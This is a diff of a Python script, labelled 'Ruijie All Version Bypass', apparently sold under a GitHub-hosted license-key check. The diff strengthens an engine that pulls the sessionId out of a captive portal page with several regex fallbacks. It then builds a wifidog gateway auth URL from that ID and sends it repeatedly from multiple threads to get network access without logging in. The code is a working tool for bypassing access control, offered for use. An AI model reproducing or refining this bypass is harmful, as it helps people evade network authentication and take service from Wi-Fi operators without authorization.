@@ -32,7 +32,7 @@ RESET = "\033[0m"
 # ===============================
 # GITHUB KEY SYSTEM CONFIG
 # ===============================
-# သင်၏ GitHub Raw Link ကို ဤနေရာတွင် ထည့်သွင်းပါ
+# GitHub Raw Link (key.txt ဖိုင်ရှိရာ လိပ်စာ)
 GITHUB_KEY_URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/main/key.txt"
 
 LOCAL_KEYS_FILE = os.path.expanduser("~/.moe_yu_approved_keys.txt")
@@ -86,7 +86,6 @@ def get_stable_system_key():
     return stable_key
 
 def fetch_authorized_keys():
-    """GitHub မှ key.txt ကို ဖတ်ယူခြင်း"""
     keys_data = {}
     try:
         response = requests.get(GITHUB_KEY_URL, timeout=10)
@@ -94,13 +93,11 @@ def fetch_authorized_keys():
             for line in response.text.strip().split('\n'):
                 line = line.strip()
                 if line:
-                    parts = line.split(',') # Key,Name,Expiry ပုံစံ
+                    parts = line.split(',') 
                     if len(parts) >= 1:
                         key = parts[0].strip()
                         expiry = parts[2].strip() if len(parts) > 2 else "2099-12-31"
                         keys_data[key] = expiry
-            
-            # Cache သိမ်းဆည်းခြင်း
             try:
                 with open(LOCAL_KEYS_FILE, 'w') as f:
                     for k, e in keys_data.items(): f.write(f"{k},{e}\n")
@@ -108,7 +105,6 @@ def fetch_authorized_keys():
             return keys_data
     except: pass
     
-    # Offline ဖြစ်လျှင် Cache မှ ပြန်ဖတ်ခြင်း
     if os.path.exists(LOCAL_KEYS_FILE):
         try:
             with open(LOCAL_KEYS_FILE, 'r') as f:
@@ -126,13 +122,11 @@ def check_approval():
     system_key = get_stable_system_key()
     print(f"{WHITE}[*] Your System Key: {GREEN}{system_key}{RESET}")
     
-    # Offline check first
     saved = load_license_info()
     if saved and is_license_valid_offline(saved['expiry']):
         print(f"{GREEN}[✓] LICENSE ACTIVE (Offline Mode){RESET}")
         return True
 
-    # Online check
     print(f"{CYAN}[*] Checking GitHub database...{RESET}")
     authorized_keys = fetch_authorized_keys()
     
@@ -151,7 +145,7 @@ def check_approval():
         return False
 
 # ===============================
-# BYPASS ENGINE
+# BYPASS ENGINE (SID Logic အသစ်ပါဝင်သည်)
 # ===============================
 STOP_EVENT = threading.Event()
 
@@ -165,8 +159,12 @@ def high_speed_ping(auth_link, sid):
         time.sleep(random.uniform(0.3, 0.8))
 
 def start_process():
+    banner = f"{MAGENTA}\nRuijie All Version Bypass\nMoe Yu Special Edition\n{RESET}"
+    print(banner)
     logging.info(f"{CYAN}Initializing Engine...{RESET}")
+
     while not STOP_EVENT.is_set():
+        session = requests.Session()
         try:
             r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
             if r.url == "http://connectivitycheck.gstatic.com/generate_204":
@@ -174,22 +172,47 @@ def start_process():
                 continue
             
             portal_url = r.url
-            parsed = urlparse(portal_url)
-            sid = parse_qs(parsed.query).get('sessionId', [None])[0]
+            print(f"\n{CYAN}[*] Captive Portal Detected{RESET}")
             
+            r1 = session.get(portal_url, verify=False, timeout=10)
+            
+            # --- SID Extraction အဆင့်မြှင့်တင်မှုများ ---
+            sid = parse_qs(urlparse(r1.url).query).get('sessionId', [None])[0]
+            
+            if not sid:
+                # JavaScript ထဲမှ ရှာခြင်း
+                sid_match = re.search(r'sessionId\s*[:=]\s*["\']([^"\']+)["\']', r1.text)
+                if sid_match: sid = sid_match.group(1)
+            
+            if not sid:
+                # URL string ထဲတွင် တိုက်ရိုက်ရှာခြင်း
+                sid_match = re.search(r'sessionId=([a-zA-Z0-9\-]+)', r1.url)
+                if sid_match: sid = sid_match.group(1)
+            
+            if not sid:
+                # HTML input field များထဲတွင် ရှာခြင်း
+                sid_match = re.search(r'name="sessionId" value="([^"]+)"', r1.text)
+                if sid_match: sid = sid_match.group(1)
+            # -------------------------------------
+
             if sid:
+                print(f"{GREEN}[✓]{RESET} Session ID Captured: {sid}")
+                parsed = urlparse(portal_url)
                 gw_addr = parse_qs(parsed.query).get('gw_address', ['192.168.60.1'])[0]
                 gw_port = parse_qs(parsed.query).get('gw_port', ['2060'])[0]
                 auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}"
                 
+                print(f"{MAGENTA}[*] Launching Turbo Threads...{RESET}")
                 for _ in range(3):
                     threading.Thread(target=high_speed_ping, args=(auth_link, sid), daemon=True).start()
+            else:
+                print(f"{RED}[!] Session ID Not Found - Please open login page in browser{RESET}")
             
             time.sleep(10)
-        except: time.sleep(5)
+        except Exception as e:
+            time.sleep(5)
 
 if __name__ == "__main__":
-    # Command Arguments
     if len(sys.argv) > 1:
         if sys.argv[1] == "--key":
             print(f"\n{GREEN}Your Key: {get_stable_system_key()}{RESET}")
